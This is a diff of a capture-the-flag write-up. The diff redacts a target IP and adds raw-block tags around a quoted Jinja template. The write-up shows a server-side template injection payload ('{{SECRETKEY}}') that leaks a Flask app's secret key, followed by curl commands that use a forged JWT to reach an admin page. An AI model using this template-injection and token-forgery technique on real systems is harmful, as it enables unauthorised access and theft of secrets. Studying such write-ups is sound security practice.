@@ -101,6 +101,7 @@ def vote():
 
     # Confirmation page
     template_source = f"""
+	{% raw %}
     {{% extends "base.html" %}}
     {{% block content %}}
       <div style='text-align:center;padding-top:2rem'>
@@ -109,6 +110,7 @@ def vote():
 
       </div>
     {{% endblock %}}
+	{% endraw %}
     """
     return render_template_string(template_source, **globals())
 
@@ -130,7 +132,7 @@ The neccessary jinja to output the secret key would be `{{SECRETKEY}}` lets see 
 Lukcily it is a horrible sanitisation method where any of these charcater `[<>?,./;:|\\'\"\[\]\-=\(\)\*&\^%$#@!~]` are removed from the string. Luckily `{` and `}` are not in this list, meaning we just need to vote for `{{SECRETKEY}}` and we get the secret key to sign our own JWT token and login to the admin page which gets us the flag.
 
 ```bash
-$ curl -X POST "http://3.105.27.130:5000/vote" -d "candidate={{SECRETKEY}}"
+$ curl -X POST "http://re.da.ct.ed:5000/vote" -d "candidate={{SECRETKEY}}"
 
     <!DOCTYPE html>
 <html lang="en">
@@ -179,7 +181,7 @@ The token checker just makes sure the token is properly signed, not that any inf
 Now time to make the request with the token
 
 ```bash
-$ curl "http://3.105.27.130:5000/admin" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.dxgk4lCPRN6NdYYweVdcpIz0VSGl3IEV27ZzhxINRjQ"
+$ curl "http://re.da.ct.ed:5000/admin" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.dxgk4lCPRN6NdYYweVdcpIz0VSGl3IEV27ZzhxINRjQ"
 <!DOCTYPE html>
 <html lang="en">
   <head>
